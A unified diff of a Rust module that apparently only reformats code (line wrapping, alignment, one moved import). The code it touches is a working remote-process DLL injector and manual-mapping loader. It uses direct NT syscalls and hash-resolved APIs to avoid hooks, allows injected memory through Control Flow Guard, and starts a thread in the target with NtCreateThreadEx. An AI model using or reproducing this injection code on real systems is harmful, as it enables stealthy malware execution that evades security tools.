@@ -9,13 +9,13 @@ use winapi::ctypes::c_void;
 use winapi::shared::ntdef::{LIST_ENTRY, UNICODE_STRING};
 // Memory and process APIs are now dispatched through nt_syscall::syscall!
 // to avoid IAT-visible Win32 hooks.  Only constants remain from winapi.
+use pe_resolve;
 use winapi::um::winnt::{
     DLL_PROCESS_ATTACH, IMAGE_DIRECTORY_ENTRY_BASERELOC, IMAGE_DIRECTORY_ENTRY_EXPORT,
     IMAGE_DOS_HEADER, IMAGE_EXPORT_DIRECTORY, IMAGE_SCN_MEM_EXECUTE, IMAGE_SCN_MEM_READ,
-    IMAGE_SCN_MEM_WRITE, MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
-    PAGE_EXECUTE, PAGE_EXECUTE_READ, PAGE_NOACCESS, PAGE_READONLY, PAGE_READWRITE,
+    IMAGE_SCN_MEM_WRITE, MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_EXECUTE, PAGE_EXECUTE_READ,
+    PAGE_EXECUTE_READWRITE, PAGE_NOACCESS, PAGE_READONLY, PAGE_READWRITE,
 };
-use pe_resolve;
 
 /// Minimal thread access for injection: THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME | THREAD_QUERY_LIMITED_INFORMATION.
 const THREAD_INJECT_ACCESS: u64 = 0x1A02;
@@ -507,16 +507,25 @@ pub unsafe fn load_dll_in_memory(dll_bytes: &[u8]) -> Result<*mut c_void> {
                 continue;
             }
             let name = section.name().unwrap_or("???");
-            let end = va.checked_add(vs).ok_or_else(|| anyhow!(
-                "PE section '{}' virtual range overflow (va={:#x}, vs={:#x})",
-                name, va, vs
-            ))?;
+            let end = va.checked_add(vs).ok_or_else(|| {
+                anyhow!(
+                    "PE section '{}' virtual range overflow (va={:#x}, vs={:#x})",
+                    name,
+                    va,
+                    vs
+                )
+            })?;
             // Check against all previously seen ranges.
             for &(prev_va, prev_end, prev_name) in &ranges {
                 if va < prev_end && end > prev_va {
                     return Err(anyhow!(
                         "PE sections '{}' [{:#x}..{:#x}) and '{}' [{:#x}..{:#x}) overlap",
-                        prev_name, prev_va, prev_end, name, va, end
+                        prev_name,
+                        prev_va,
+                        prev_end,
+                        name,
+                        va,
+                        end
                     ));
                 }
             }
@@ -588,8 +597,8 @@ pub unsafe fn load_dll_in_memory(dll_bytes: &[u8]) -> Result<*mut c_void> {
     const IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT: usize = 13;
     const DELAY_DESCR_SIZE: usize = 32; // 8 × u32
 
-    if let Some(delay_dir) = optional_header.data_directories.data_directories
-        [IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT]
+    if let Some(delay_dir) =
+        optional_header.data_directories.data_directories[IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT]
     {
         if delay_dir.virtual_address != 0 && delay_dir.size > 0 {
             let image_size = optional_header.windows_fields.size_of_image as usize;
@@ -603,11 +612,11 @@ pub unsafe fn load_dll_in_memory(dll_bytes: &[u8]) -> Result<*mut c_void> {
 
                 // Read descriptor fields directly from the mapped image.
                 let base_ptr = image_base as *const u8;
-                let grattrs       = *(base_ptr.add(desc_va)        as *const u32);
-                let dll_name_rva  = *(base_ptr.add(desc_va + 0x04) as *const u32) as usize;
-                let hmod_rva      = *(base_ptr.add(desc_va + 0x08) as *const u32) as usize;
-                let iat_rva       = *(base_ptr.add(desc_va + 0x0C) as *const u32) as usize;
-                let int_rva       = *(base_ptr.add(desc_va + 0x10) as *const u32) as usize;
+                let grattrs = *(base_ptr.add(desc_va) as *const u32);
+                let dll_name_rva = *(base_ptr.add(desc_va + 0x04) as *const u32) as usize;
+                let hmod_rva = *(base_ptr.add(desc_va + 0x08) as *const u32) as usize;
+                let iat_rva = *(base_ptr.add(desc_va + 0x0C) as *const u32) as usize;
+                let int_rva = *(base_ptr.add(desc_va + 0x10) as *const u32) as usize;
 
                 // Null-terminator descriptor: all-zero entry.
                 if dll_name_rva == 0 {
@@ -672,7 +681,11 @@ pub unsafe fn load_dll_in_memory(dll_bytes: &[u8]) -> Result<*mut c_void> {
                 let is_pe32_plus = optional_header.standard_fields.magic == 0x020B;
                 let thunk_entry_size: usize = if is_pe32_plus { 8 } else { 4 };
                 let ordinal_flag_mask: u64 = if is_pe32_plus { 1u64 << 63 } else { 1u64 << 31 };
-                let rva_mask: u64 = if is_pe32_plus { 0x7FFF_FFFF_FFFF_FFFF } else { 0x7FFF_FFFF };
+                let rva_mask: u64 = if is_pe32_plus {
+                    0x7FFF_FFFF_FFFF_FFFF
+                } else {
+                    0x7FFF_FFFF
+                };
 
                 let thunk_base_rva = if int_rva != 0 { int_rva } else { iat_rva };
                 if thunk_base_rva == 0 || iat_rva == 0 {
@@ -688,7 +701,9 @@ pub unsafe fn load_dll_in_memory(dll_bytes: &[u8]) -> Result<*mut c_void> {
                 loop {
                     let thunk_rva = thunk_base_rva + slot_idx * thunk_entry_size;
                     let iat_slot_rva = iat_rva + slot_idx * thunk_entry_size;
-                    if thunk_rva + thunk_entry_size > image_size || iat_slot_rva + thunk_entry_size > image_size {
+                    if thunk_rva + thunk_entry_size > image_size
+                        || iat_slot_rva + thunk_entry_size > image_size
+                    {
                         break;
                     }
 
@@ -717,9 +732,7 @@ pub unsafe fn load_dll_in_memory(dll_bytes: &[u8]) -> Result<*mut c_void> {
                             ));
                         }
                         let name_ptr = base_ptr.add(ibn_rva + 2) as *const i8;
-                        let func_name = std::ffi::CStr::from_ptr(name_ptr)
-                            .to_str()
-                            .unwrap_or("");
+                        let func_name = std::ffi::CStr::from_ptr(name_ptr).to_str().unwrap_or("");
                         if func_name.is_empty() {
                             return Err(anyhow!(
                                 "manual_map: delay-import: {}!slot-{} has empty import name",
@@ -1130,8 +1143,7 @@ unsafe fn get_remote_ntdll_base(target_process: winapi::shared::ntdef::HANDLE) -
         *mut u32,
     ) -> i32;
 
-    let local_ntdll =
-        pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"ntdll.dll\0"))?;
+    let local_ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"ntdll.dll\0"))?;
     let ntqip_addr = pe_resolve::get_proc_address_by_hash(
         local_ntdll,
         pe_resolve::hash_str(b"NtQueryInformationProcess\0"),
@@ -1430,18 +1442,16 @@ unsafe fn resolve_remote_export(
     let ordinals = read_bytes(remote_dll_base + ordinal_table_rva, num_names * 2)?;
 
     for i in 0..num_names {
-        let name_rva =
-            u32::from_le_bytes(name_ptrs[i * 4..i * 4 + 4].try_into().unwrap()) as usize;
+        let name_rva = u32::from_le_bytes(name_ptrs[i * 4..i * 4 + 4].try_into().unwrap()) as usize;
         // Read the null-terminated export name (cap at 256 bytes to bound I/O).
-        let name_raw = read_bytes(remote_dll_base + name_rva, 256)
-            .unwrap_or_else(|_| vec![0u8; 256]);
+        let name_raw =
+            read_bytes(remote_dll_base + name_rva, 256).unwrap_or_else(|_| vec![0u8; 256]);
         let nul = name_raw.iter().position(|&b| b == 0).unwrap_or(256);
         let name = std::str::from_utf8(&name_raw[..nul]).unwrap_or("");
         if name == fn_name {
             let ordinal =
                 u16::from_le_bytes(ordinals[i * 2..i * 2 + 2].try_into().unwrap()) as usize;
-            let fn_rva_bytes =
-                read_bytes(remote_dll_base + fn_table_rva + ordinal * 4, 4)?;
+            let fn_rva_bytes = read_bytes(remote_dll_base + fn_table_rva + ordinal * 4, 4)?;
             let fn_rva = u32::from_le_bytes(fn_rva_bytes.try_into().unwrap()) as usize;
             return Ok(remote_dll_base + fn_rva);
         }
@@ -1525,63 +1535,63 @@ pub unsafe fn load_dll_in_remote_process(
     // kernelbase). If either differs, switch to remote-module resolution.
     let local_ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"ntdll.dll\0"));
     let remote_ntdll = get_remote_ntdll_base(target_process);
-    let remote_module_map: Option<HashMap<String, usize>> =
-        if let (Some(local), Some(remote)) = (local_ntdll, remote_ntdll) {
-            if local != remote {
-                tracing::warn!(
-                    "remote_manual_map: NTDLL base mismatch (local={:#x}, remote={:#x}). \
+    let remote_module_map: Option<HashMap<String, usize>> = if let (Some(local), Some(remote)) =
+        (local_ntdll, remote_ntdll)
+    {
+        if local != remote {
+            tracing::warn!(
+                "remote_manual_map: NTDLL base mismatch (local={:#x}, remote={:#x}). \
                      Shared ASLR assumption does not hold — resolving imports from \
                      remote process module list.",
-                    local,
-                    remote
-                );
-                // Build the remote module map; fail immediately if enumeration
-                // fails rather than proceeding with incorrect local addresses.
-                Some(build_remote_module_map(target_process)?)
-            } else {
-                // ntdll matches: verify other critical DLL bases before taking
-                // the shared-ASLR fast path.
-                match build_remote_module_map(target_process) {
-                    Ok(rmod) => {
-                        let local_kernel32 = pe_resolve::get_module_handle_by_hash(
-                            pe_resolve::hash_str(b"kernel32.dll\0"),
-                        );
-                        let local_kernelbase = pe_resolve::get_module_handle_by_hash(
-                            pe_resolve::hash_str(b"kernelbase.dll\0"),
-                        );
-                        let remote_kernel32 = rmod.get("kernel32.dll").copied();
-                        let remote_kernelbase = rmod.get("kernelbase.dll").copied();
+                local,
+                remote
+            );
+            // Build the remote module map; fail immediately if enumeration
+            // fails rather than proceeding with incorrect local addresses.
+            Some(build_remote_module_map(target_process)?)
+        } else {
+            // ntdll matches: verify other critical DLL bases before taking
+            // the shared-ASLR fast path.
+            match build_remote_module_map(target_process) {
+                Ok(rmod) => {
+                    let local_kernel32 = pe_resolve::get_module_handle_by_hash(
+                        pe_resolve::hash_str(b"kernel32.dll\0"),
+                    );
+                    let local_kernelbase = pe_resolve::get_module_handle_by_hash(
+                        pe_resolve::hash_str(b"kernelbase.dll\0"),
+                    );
+                    let remote_kernel32 = rmod.get("kernel32.dll").copied();
+                    let remote_kernelbase = rmod.get("kernelbase.dll").copied();
 
-                        let kernel32_mismatch =
-                            matches!((local_kernel32, remote_kernel32), (Some(l), Some(r)) if l != r);
-                        let kernelbase_mismatch =
-                            matches!((local_kernelbase, remote_kernelbase), (Some(l), Some(r)) if l != r);
+                    let kernel32_mismatch =
+                        matches!((local_kernel32, remote_kernel32), (Some(l), Some(r)) if l != r);
+                    let kernelbase_mismatch = matches!((local_kernelbase, remote_kernelbase), (Some(l), Some(r)) if l != r);
 
-                        if kernel32_mismatch || kernelbase_mismatch {
-                tracing::warn!(
+                    if kernel32_mismatch || kernelbase_mismatch {
+                        tracing::warn!(
                                 "remote_manual_map: shared-ASLR verification failed (kernel32 mismatch={}, kernelbase mismatch={}); resolving imports from remote process module list.",
                                 kernel32_mismatch,
                                 kernelbase_mismatch
                             );
-                            Some(rmod)
-                        } else {
-                            None
-                        }
-                    }
-                    Err(err) => {
-                        // Preserve the fast path when the extra verification step
-                        // cannot be performed and ntdll already matches.
-                tracing::warn!(
-                            "remote_manual_map: unable to verify kernel32/kernelbase base parity ({}); keeping shared-ASLR fast path",
-                            err
-                        );
+                        Some(rmod)
+                    } else {
                         None
                     }
                 }
+                Err(err) => {
+                    // Preserve the fast path when the extra verification step
+                    // cannot be performed and ntdll already matches.
+                    tracing::warn!(
+                            "remote_manual_map: unable to verify kernel32/kernelbase base parity ({}); keeping shared-ASLR fast path",
+                            err
+                        );
+                    None
+                }
             }
-        } else {
-            None
-        };
+        }
+    } else {
+        None
+    };
 
     // ── Step 1: allocate in the remote process ────────────────────────────
     // Use NtAllocateVirtualMemory to avoid IAT-visible VirtualAllocEx hooks.
@@ -1638,7 +1648,12 @@ pub unsafe fn load_dll_in_remote_process(
         let mut prot_base = dest;
         let mut prot_size = data.len();
         let mut old_prot = 0u32;
-        protect_remote(&mut prot_base, &mut prot_size, PAGE_READWRITE, &mut old_prot)?;
+        protect_remote(
+            &mut prot_base,
+            &mut prot_size,
+            PAGE_READWRITE,
+            &mut old_prot,
+        )?;
 
         let mut written = 0usize;
         let status = nt_syscall::syscall!(
@@ -1652,12 +1667,7 @@ pub unsafe fn load_dll_in_remote_process(
 
         let mut restore_dummy = 0u32;
         // Restore original protection even if the write failed.
-        let _ = protect_remote(
-            &mut prot_base,
-            &mut prot_size,
-            old_prot,
-            &mut restore_dummy,
-        );
+        let _ = protect_remote(&mut prot_base, &mut prot_size, old_prot, &mut restore_dummy);
 
         if status.as_ref().map_or(true, |s| *s < 0) || written != data.len() {
             return Err(anyhow!(
@@ -1685,15 +1695,24 @@ pub unsafe fn load_dll_in_remote_process(
                 continue;
             }
             let name = section.name().unwrap_or("???");
-            let end = va.checked_add(vs).ok_or_else(|| anyhow!(
-                "PE section '{}' virtual range overflow (va={:#x}, vs={:#x})",
-                name, va, vs
-            ))?;
+            let end = va.checked_add(vs).ok_or_else(|| {
+                anyhow!(
+                    "PE section '{}' virtual range overflow (va={:#x}, vs={:#x})",
+                    name,
+                    va,
+                    vs
+                )
+            })?;
             for &(prev_va, prev_end, prev_name) in &ranges {
                 if va < prev_end && end > prev_va {
                     return Err(anyhow!(
                         "PE sections '{}' [{:#x}..{:#x}) and '{}' [{:#x}..{:#x}) overlap",
-                        prev_name, prev_va, prev_end, name, va, end
+                        prev_name,
+                        prev_va,
+                        prev_end,
+                        name,
+                        va,
+                        end
                     ));
                 }
             }
@@ -1765,9 +1784,8 @@ pub unsafe fn load_dll_in_remote_process(
     // silently — those systems don't enforce CFG at kernel level anyway.
     #[cfg(target_arch = "x86_64")]
     {
-        let kernelbase = pe_resolve::get_module_handle_by_hash(
-            pe_resolve::hash_str(b"kernelbase.dll\0"),
-        );
+        let kernelbase =
+            pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"kernelbase.dll\0"));
         if let Some(base) = kernelbase {
             let fn_addr = pe_resolve::get_proc_address_by_hash(
                 base,
@@ -1782,12 +1800,13 @@ pub unsafe fn load_dll_in_remote_process(
                 //   PCFG_CALL_TARGET_INFO OffsetInformation
                 // );
                 type SetProcessValidCallTargetsFn = unsafe extern "system" fn(
-                    *mut c_void, // HANDLE hProcess
-                    *mut c_void, // PVOID VirtualAddress
-                    usize,       // SIZE_T RegionSize
-                    u32,         // ULONG NumberOfOffsets
+                    *mut c_void,              // HANDLE hProcess
+                    *mut c_void,              // PVOID VirtualAddress
+                    usize,                    // SIZE_T RegionSize
+                    u32,                      // ULONG NumberOfOffsets
                     *const CfgCallTargetInfo, // PCFG_CALL_TARGET_INFO
-                ) -> i32; // BOOL
+                )
+                    -> i32; // BOOL
 
                 #[repr(C)]
                 struct CfgCallTargetInfo {
@@ -1805,8 +1824,7 @@ pub unsafe fn load_dll_in_remote_process(
                         | CFG_CALL_TARGET_CONVERT_EXPORT_SUPPRESSED_TO_VALID,
                 };
 
-                let set_cfg_targets: SetProcessValidCallTargetsFn =
-                    std::mem::transmute(addr);
+                let set_cfg_targets: SetProcessValidCallTargetsFn = std::mem::transmute(addr);
                 let result = unsafe {
                     set_cfg_targets(
                         target_process as *mut c_void,
@@ -1833,8 +1851,8 @@ pub unsafe fn load_dll_in_remote_process(
     // All patches are computed in a local buffer then written remotely.
     let base_delta = remote_base as isize - preferred_base;
     if base_delta != 0 {
-        if let Some(reloc_dir) = opt.data_directories.data_directories
-            [IMAGE_DIRECTORY_ENTRY_BASERELOC as usize]
+        if let Some(reloc_dir) =
+            opt.data_directories.data_directories[IMAGE_DIRECTORY_ENTRY_BASERELOC as usize]
         {
             if reloc_dir.virtual_address != 0 && reloc_dir.size > 0 {
                 let reloc_rva = reloc_dir.virtual_address as usize;
@@ -1860,12 +1878,12 @@ pub unsafe fn load_dll_in_remote_process(
 
                 let mut offset = 0usize;
                 while offset + 8 <= reloc_size {
-                    let page_rva = u32::from_le_bytes(
-                        reloc_data[offset..offset + 4].try_into().unwrap(),
-                    ) as usize;
-                    let block_size = u32::from_le_bytes(
-                        reloc_data[offset + 4..offset + 8].try_into().unwrap(),
-                    ) as usize;
+                    let page_rva =
+                        u32::from_le_bytes(reloc_data[offset..offset + 4].try_into().unwrap())
+                            as usize;
+                    let block_size =
+                        u32::from_le_bytes(reloc_data[offset + 4..offset + 8].try_into().unwrap())
+                            as usize;
                     if block_size < 8 || offset + block_size > reloc_size {
                         break;
                     }
@@ -1927,8 +1945,7 @@ pub unsafe fn load_dll_in_remote_process(
                                     ));
                                 }
                                 let val = i32::from_le_bytes(buf);
-                                let patched =
-                                    ((val as isize + base_delta) as i32).to_le_bytes();
+                                let patched = ((val as isize + base_delta) as i32).to_le_bytes();
                                 write_remote(field_rva, &patched)?;
                             }
                             0 => {} // padding
@@ -2072,9 +2089,8 @@ pub unsafe fn load_dll_in_remote_process(
                     &mut n as *mut _ as u64,
                 );
                 if read_status.map_or(false, |s| s >= 0) && n == 40 {
-                    let callbacks_va = u64::from_le_bytes(
-                        tls_dir_buf[24..32].try_into().unwrap(),
-                    ) as usize;
+                    let callbacks_va =
+                        u64::from_le_bytes(tls_dir_buf[24..32].try_into().unwrap()) as usize;
                     if callbacks_va != 0 {
                         // Walk the null-terminated callback array.
                         let mut remaining = 32u32; // defensive cap
@@ -2186,8 +2202,7 @@ pub unsafe fn load_dll_in_remote_process(
                 } else {
                     // Fast path: shared ASLR — resolve locally via PEB walk.
                     let ntdll_hash = pe_resolve::hash_str(b"ntdll.dll\0");
-                    let ntdll_base =
-                        pe_resolve::get_module_handle_by_hash(ntdll_hash).unwrap_or(0);
+                    let ntdll_base = pe_resolve::get_module_handle_by_hash(ntdll_hash).unwrap_or(0);
                     if ntdll_base == 0 {
                         tracing::warn!(
                             "remote_manual_map: ntdll not found via PEB walk; \
@@ -2196,8 +2211,8 @@ pub unsafe fn load_dll_in_remote_process(
                         0
                     } else {
                         let fn_hash = pe_resolve::hash_str(b"RtlAddFunctionTable\0");
-                        let addr = pe_resolve::get_proc_address_by_hash(ntdll_base, fn_hash)
-                            .unwrap_or(0);
+                        let addr =
+                            pe_resolve::get_proc_address_by_hash(ntdll_base, fn_hash).unwrap_or(0);
                         if addr == 0 {
                             tracing::warn!(
                                 "remote_manual_map: RtlAddFunctionTable not found \
@@ -2360,8 +2375,8 @@ pub unsafe fn load_dll_in_remote_process(
         let mut h_thread: *mut winapi::ctypes::c_void = std::ptr::null_mut();
         let status = nt_syscall::syscall!(
             "NtCreateThreadEx",
-            &mut h_thread as *mut _ as u64,       // ThreadHandle
-            THREAD_INJECT_ACCESS,                          // minimal thread access
+            &mut h_thread as *mut _ as u64,        // ThreadHandle
+            THREAD_INJECT_ACCESS,                  // minimal thread access
             std::ptr::null_mut::<c_void>() as u64, // ObjectAttributes
             target_process as u64,                 // ProcessHandle
             stub_mem as u64,                       // StartRoutine
@@ -2384,4 +2399,3 @@ pub unsafe fn load_dll_in_remote_process(
 
     Ok(remote_base)
 }
-
